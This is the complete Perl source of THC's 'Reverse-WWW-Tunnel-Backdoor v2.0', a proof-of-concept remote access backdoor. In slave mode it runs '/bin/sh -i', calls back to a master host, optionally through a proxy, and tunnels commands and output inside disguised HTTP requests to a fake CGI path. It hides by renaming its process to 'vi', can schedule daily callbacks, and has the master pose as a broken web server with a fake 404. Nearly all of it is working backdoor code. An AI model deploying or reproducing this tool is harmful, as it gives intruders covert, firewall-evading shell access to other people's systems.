#
# Reverse-WWW-Tunnel-Backdoor v2.0
# (c) 1998-2002 by van Hauser / [THC] - The Hacker's Choice <vh@reptile.rug.ac.be>
# Check out http://www.thehackerschoice.com
# Proof-of-Concept Program for the paper "Placing Backdoors through Firewalls"
# available at the website above in the "Articles" section.
#

# Greets to all THC, TESO, ADM and #bluebox guys

# verified to work on Linux, Solaris, AIX and OpenBSD

# BUGS: some Solaris machines: select(3) is broken, won't work there
#	on some systems Perl's recv is broken :-( (AIX, OpenBSD) ...
#	we can't make proper receive checks here. Workaround implemented.
#
# HISTORY:
# v2.0: HTTP 1.0 protocol compliance (finally ;-)
# v1.6: included www-proxy authentication ;-))
# v1.4: porting to various unix types (and I thought perl'd be portable...)
# v1.3: initial public release of the paper including this tool

#
# GENERAL CONFIG (except for $MASK, everything must be the same
#		  for MASTER and SLAVE is this section!)
#
$MODE="POST";			 # GET or POST
$CGI_PREFIX="/cgi-bin/orderform";# should look like a valid cgi.
$MASK="vi";			 # for masking the program's process name
$PASSWORD="THC";		 # anything, nothing you have to rememeber
				 # (not a real "password" anyway)
#
# MASTER CONFIG (specific for the MASTER)
#
$LISTEN_PORT=8080;	# on which port to listen (80 [needs root] or 8080)
$SERVER="127.0.0.1";	# the host to run on (ip/dns) (the SLAVE needs this!)

#
# SLAVE CONFIG (specific for the SLAVE)
#
$SHELL="/bin/sh -i";	# program to execute (e.g. /bin/sh)
$DELAY="3";		# time to wait for output after your command(s)
#$TIME="14:39";		# time when to connect to the master (unset if now)
#$DAILY="yes";		# tries to connect once daily if set with something
#$PROXY="127.0.0.1";	# set this with the Proxy if you must use one
#$PROXY_PORT="3128";	# set this with the Proxy Port if you must use one
#$PROXY_USER="user";	# username for proxy authentication
#$PROXY_PASSWORD="pass";# password for proxy authentication
#$DEBUG="yes";		# for debugging purpose, turn off when in production
$BROKEN_RECV="yes";	# For AIX & OpenBSD, NOT for Linux & Solaris

# END OF CONFIG		# nothing for you to do after this point #

################## BEGIN MAIN CODE ##################

require 5.002;
use Socket;

$|=1;				# next line changes our process name
if ($MASK) { for ($a=1;$a<80;$a++){$MASK=$MASK."\000";}  $0=$MASK; }
undef $DAILY   if (! $TIME);
if ( !($PROXY) || !($PROXY_PORT) ) {
	undef $PROXY;
	undef $PROXY_PORT;
}
$protocol = getprotobyname('tcp');

if ($ARGV[0] ne "slave" && $ARGV[0] ne "daemon" && $ARGV[0] ne "master" && $ARGV[1] eq "") {
	print STDOUT "Proof-of-Concept Program for the paper \"Placing Backdoors through Firewalls\"\navailable at http://www.thehackerschoice.com in the \"Articles\" section.\n";
	print STDOUT "Commandline options for rwwwshell:\n\tmaster\t- master mode\n\tslave\t- slave mode\n";
	exit(0);
}

if ($ARGV[0] eq "slave") {
	print STDOUT "starting in slave mode\n";
	$SLAVE_MODE = "yeah";
}

# check for a correct mode
if ($MODE ne "GET" && $MODE ne "POST") {
	print STDOUT "Error: MODE must either be GET or POST, re-edit this perl config\n";
	exit(-1);
}

if (! $SLAVE_MODE) { 
	&master;
} else {
	&slave;
}
# END OF MAIN FUNCTION

############### SLAVE FUNCTION ###############

sub slave {
	$pid = 0;
	$PROXY_SUFFIX = "Host: " . $SERVER . "\r\nUser-Agent: Mozilla/4.0\r\nAccept: text/html, text/plain, image/jpeg, image/*;\r\nAccept-Language: en\r\n";
	if ($PROXY) {		# setting the real config (for Proxy Support)
		$REAL_SERVER = $PROXY;
		$REAL_PORT = $PROXY_PORT;
		$REAL_PREFIX = $MODE . " http://" . $SERVER . ":" . $LISTEN_PORT
			. $CGI_PREFIX;
		$PROXY_SUFFIX = $PROXY_SUFFIX . "Pragma: no-cache\r\n";
		if ( $PROXY_USER && USER_PASSWORD ) {
			&base64encoding;
			$PROXY_SUFFIX = $PROXY_SUFFIX . $PROXY_COOKIE;
		}
	} else {
		$REAL_SERVER = $SERVER;
		$REAL_PORT = $LISTEN_PORT;
		$REAL_PREFIX = $MODE . " " . $CGI_PREFIX;
	}
	$REAL_PREFIX = $REAL_PREFIX . "?"	if ($MODE eq "GET");
	$REAL_PREFIX = $REAL_PREFIX . " HTTP/1.0\r\n"	if ($MODE eq "POST");
AGAIN:	if ($pid) { kill 9, $pid; }
	if ($TIME) {			# wait until the specified $TIME
		$TIME =~ s/^0//;	$TIME =~ s/:0/:/;
		(undef,$min,$hour,undef,undef,undef,undef,undef,undef)
			= localtime(time);
		$t=$hour . ":" . $min;
		while ($TIME ne $t) {
			sleep(28); # every 28 seconds we look at the watch
			(undef,$min,$hour,undef,undef,undef,undef,undef,undef)
				= localtime(time);
			$t=$hour . ":" .$min;
		}
	}
	print STDERR "Slave activated\n"	if $DEBUG;
	if ($DAILY) {			# if we must connect daily, we'll
		if (fork) {		# fork the daily shell process to
			sleep(69);	# ensure the master control process
			goto AGAIN;	# won't get stuck by a fucking cmd
		}			# the user executed.
	print STDERR "forked\n" if $DEBUG;
	}
	$address = inet_aton($REAL_SERVER) || die "can't resolve server\n";
	$remote = sockaddr_in($REAL_PORT, $address);
	$forked = 0;
GO:	close(THC);
	socket(THC, &PF_INET, &SOCK_STREAM, $protocol)
		or die "can't create socket\n";
	setsockopt(THC, SOL_SOCKET, SO_REUSEADDR, 1);
	if (! $forked) {		# fork failed? fuck, let's try again
		pipe R_IN, W_IN;        select W_IN;  $|=1;
		pipe R_OUT, W_OUT;      select W_OUT; $|=1;
		$pid = fork;
		if (! defined $pid) {
			close THC;
			close R_IN;	close W_IN;
			close R_OUT;	close W_OUT;
			goto GO;
		}
		$forked = 1;
	}
	if (! $pid) {           # this is the child process (execs $SHELL)
		close R_OUT;	close W_IN;	close THC;
		print STDERR "forking $SHELL in child\n"	if $DEBUG;
		open STDIN,  "<&R_IN";
		open STDOUT, ">&W_OUT";
		open STDERR, ">&W_OUT";
		exec $SHELL || print W_OUT "couldn't spawn $SHELL\n";
		close R_IN;     close W_OUT;
		exit(0);
	} else {                # this is the parent (data control + network)
		close R_IN;
		sleep($DELAY);	# we wait $DELAY for the commands to complete
		vec($rs, fileno(R_OUT), 1) = 1;
		print STDERR "before: allwritten2stdin\n"	if $DEBUG;
		select($r = $rs, undef, undef, 30);
		print STDERR "after : wait for allwritten2stdin\n" if $DEBUG;
		sleep(1);	# The following readin of the command output
		$output = "";	# looks weird. It must be! every system
		vec($ws, fileno(W_OUT), 1) = 1;     # behaves different :-((
		print STDERR "before: readwhiledatafromstdout\n"   if $DEBUG;
		while (select($w = $ws, undef, undef, 1)) {
			read R_OUT, $readout, 1 || last;
			$output = $output . $readout;
		}
		print STDERR "after : readwhiledatafromstdout\n"   if $DEBUG;
		print STDERR "before: fucksunprob\n"	if $DEBUG;
		vec($ws, fileno(W_OUT), 1) = 1;
		while (! select(undef, $w=$ws, undef, 0.001)) {
			read R_OUT, $readout, 1 || last;
			$output = $output . $readout;
		}
		print STDERR "after : fucksunprob\n"	if $DEBUG;
		print STDERR "send 0byte to stdout, fail->exit\n"   if $DEBUG;
		print W_OUT "\000" || goto END_IT;
		print STDERR "before: readallstdoutdatawhile!eod\n" if $DEBUG;
		while (1) {
			read R_OUT, $readout, 1 || last;
			last  if ($readout eq "\000");
			$output = $output . $readout;
		}
		print STDERR "after : readallstdoutdatawhile!eod\n" if $DEBUG;
		&uuencode;	# does the encoding of the shell output
		if ($MODE eq "GET") {
			$encoded = $REAL_PREFIX . $encoded . " HTTP/1.0\r\n";
			$encoded = $encoded . $PROXY_SUFFIX;
			$encoded = $encoded . "\r\n";
		} else {	# $MODE is "POST"
			$encoded = $REAL_PREFIX . $PROXY_SUFFIX
			 . "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
			 . $encoded . "\r\n";
		}
		print STDERR "connecting to remote, fail->exit\n" if $DEBUG;
		connect(THC, $remote) || goto END_IT;	# connect to master
		print STDERR "send encoded data, fail->exit\n" if $DEBUG;
		send (THC, $encoded, 0) || goto END_IT;	# and send data
		$input = "";
		vec($rt, fileno(THC), 1) = 1;  # wait until master sends reply
		print STDERR "before: wait4answerfromremote\n"	if $DEBUG;
		while (! select($r = $rt, undef, undef, 0.00001)) {}
		print STDERR "after : wait4answerfromremote\n"	if $DEBUG;
		print STDERR "read data from socket until eod\n" if $DEBUG;
		$error="no";
#		while (1) {		# read until EOD (End Of Data)
			print STDERR "?"	if $DEBUG;
	# OpenBSD 2.2 can't recv here! can't get any data! sucks ...
			recv (THC, $readin, 16386, 0) || undef $error;
#			if ((! $error) and (! $BROKEN_RECV)) { goto OK; }
			print STDERR "!"	if $DEBUG;
			goto OK  if (($readin eq "\000") or ($readin eq "\n")
				or ($readin eq ""));
			$input = $input . $readin;
#		}
OK:		print STDERR "\nall data read, entering OK\n"	if $DEBUG;
		print STDERR "RECEIVE: $input\n"	if $DEBUG;
		$input =~ s/.*\r\n\r\n//s;
		print STDERR "BEFORE DECODING: $input\n"	if $DEBUG;
		&uudecode;		# decoding the data from the master
		print STDERR "AFTER DECODING: $decoded\n"	if $DEBUG;
		print STDERR "if password not found -> exit\n"	if $DEBUG;
		goto END_IT	if ($decoded =~ m/^$PASSWORD/s == 0);
		$decoded =~ s/^$PASSWORD//;
		print STDERR "writing input data to $SHELL\n"	if $DEBUG;
		print W_IN "$decoded" || goto END_IT;	# sending the data
		sleep(1);				# to the shell proc.
		print STDERR "jumping to GO\n"	if $DEBUG;
		goto GO;
	}
END_IT:	kill 9, $pid;	$pid = 0;
	exit(0);
} # END OF SLAVE FUNCTION

############### MASTER FUNCTION ###############

sub master {
	socket(THC, &PF_INET, &SOCK_STREAM, $protocol)
		or die "can't create socket\n";
	setsockopt(THC, SOL_SOCKET, SO_REUSEADDR, 1);
	bind(THC, sockaddr_in($LISTEN_PORT, INADDR_ANY)) || die "can't bind\n";
	listen(THC, 3) || die "can't listen\n";		# print the HELP
	print STDOUT '
Welcome to the Reverse-WWW-Tunnel-Backdoor v2.0 by van Hauser / THC ...

Introduction: 	Wait for your SLAVE to connect, examine it\'s output and then
		type in your commands to execute on SLAVE. You\'ll have to
		wait min. the set $DELAY seconds before you get the output
		and can execute the next stuff. Use ";" for multiple commands.
		Trying to execute interactive commands may give you headache
		so beware. Your SLAVE may hang until the daily connect try
		(if set - otherwise you lost).
		You also shouldn\'t try to view binary data too ;-)
		"echo bla >> file", "cat >> file <<- EOF", sed etc. are your
		friends if you don\'t like using vi in a delayed line mode ;-)
		To exit this program on any time without doing harm to either
		MASTER or SLAVE just press Control-C.
		Now have fun.
';

YOP:	print STDOUT "\nWaiting for connect ...";
	$remote=accept (S, THC)  ||  goto YOP;		# get the connection
	($r_port, $r_slave)=sockaddr_in($remote);	# and print the SLAVE
	$slave=gethostbyaddr($r_slave, AF_INET);	# data.
	$slave="unresolved" if ($slave eq "");
	print STDOUT " connect from $slave/".inet_ntoa($r_slave).":$r_port\n";
	select S;	$|=1;
	select STDOUT;	$|=1;
	$input = "";
	vec($socks, fileno(S), 1) = 1;
	$error="no";
#	while (1) {			# read the data sent by the slave
		while (! select($r = $socks, undef, undef, 0.00001)) {}
		recv (S, $readin, 16386, 0) || undef $error;
		if ((! $error) and (! $BROKEN_RECV)) {
		    print STDOUT "[disconnected]\n";
		}
#		$readin =~ s/\r//g;
#		$input = $input . $readin;
#		last  if ( $input =~ m/\r\n\r\n/s );
		$input = $readin;
		print STDERR "MASTER RECEIVE: $input\n"	if $DEBUG;
#	}
	&hide_as_broken_webserver  if ( $input =~ m/$CGI_PREFIX/s == 0 );
	if ( $input =~ m/^GET /s ) {
		$input =~ s/^.*($CGI_PREFIX)\??//s;
		$input =~ s/\r\n.*$//s;
	} else { if ( $input =~ m/^POST /s ) {
		$input =~ s/^.*\r\n\r\n//s;
	} else { if ( $input =~ m/^HEAD /s ) {
		&hide_as_broken_webserver;
	} else {
		close S;
		print STDOUT "Warning! Illegal server access!\n";   # report to user
		goto YOP;
	} } }
	print STDERR "BEFORE DECODING: $input\n"	if $DEBUG;
	&uudecode;		# decoding the data from the slave
	&hide_as_broken_webserver  if ( $decoded =~ m/^$PASSWORD/s == 0 );
	$decoded =~ s/^$PASSWORD//s;
	$decoded = "[Warning! No output from remote!]\n>" if ($decoded eq "");
	print STDOUT "$decoded";	# showing the slave output to the user
	$output = <STDIN>;		# and get his input.
	&uuencode;		# encode the data for the slave
	$encoded = "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/plain\r\n\r\n" . $encoded . "\r\n";
	send (S, $encoded, 0) || die "\nconnection lost!\n";	# and send it
	close (S);
	print STDOUT "sent.\n";
	goto YOP;		# wait for the next connect from the slave
} # END OF MASTER FUNCTION

###################### MISC. FUNCTIONS #####################

sub uuencode {	# does the encoding stuff for error-free data transfer via WWW
	$output = $PASSWORD . $output;		# PW is for error checking and
        $uuencoded = pack "u", "$output";	# preventing sysadmins from
        $uuencoded =~ tr/'\n)=(:;&><,#$*%]!\@"`\\\-'	# sending you weird
                        /'zcadefghjklmnopqrstuv'	# data. No real
                        /;				# security!
        $uuencoded =~ tr/"'"/'b'/;
	if ( ($PROXY) && ($SLAVE_MODE) ) {# proxy drops request if > 4kb
		$codelength = (length $uuencoded) + (length $REAL_PREFIX) +12;
		$cut_length = 4099 - (length $REAL_PREFIX);
		$uuencoded = pack "a$cut_length", $uuencoded
			if ($codelength > 4111);
	}
        $encoded = $uuencoded;
} # END OF UUENCODE FUNCTION

sub uudecode {	# does the decoding of the data stream
	$input =~     tr/'zcadefghjklmnopqrstuv'
			/'\n)=(:;&><,#$*%]!\@"`\\\-'
			/;
	$input =~     tr/'b'/"'"/;
	$decoded = unpack "u", "$input";
} # END OF UUDECODE FUNCTION

sub base64encoding {	# does the base64 encoding for proxy passwords
	$encode_string = $PROXY_USER . ":" . $PROXY_PASSWORD;
	$encoded_string = substr(pack('u', $encode_string), 1);
	chomp($encoded_string);
	$encoded_string =~ tr|` -_|AA-Za-z0-9+/|;
	$padding = (3 - length($encode_string) % 3) % 3;
	$encoded_string =~ s/.{$padding}$/'=' x $padding/e if $padding;
	$PROXY_COOKIE = "Proxy-authorization: Basic " . $encoded_string . "\n";
} # END OF BASE64ENCODING FUNCTION

sub hide_as_broken_webserver {	# invalid request -> look like broken server
	send (S, "<HTML><HEAD>\r\n<TITLE>404 File Not Found</TITLE>\r\n</HEAD>".
		 "<BODY>\r\n<H1>File Not Found</H1>\r\n</BODY></HTML>\r\n", 0);
	close S;
	print STDOUT "Warning! Illegal server access!\n";   # report to user
	goto YOP;
} # END OF HIDE_AS_BROKEN_WEBSERVER FUNCTION

# END OF PROGRAM # (c) 1998-2002 by <vh@reptile.rug.ac.be>
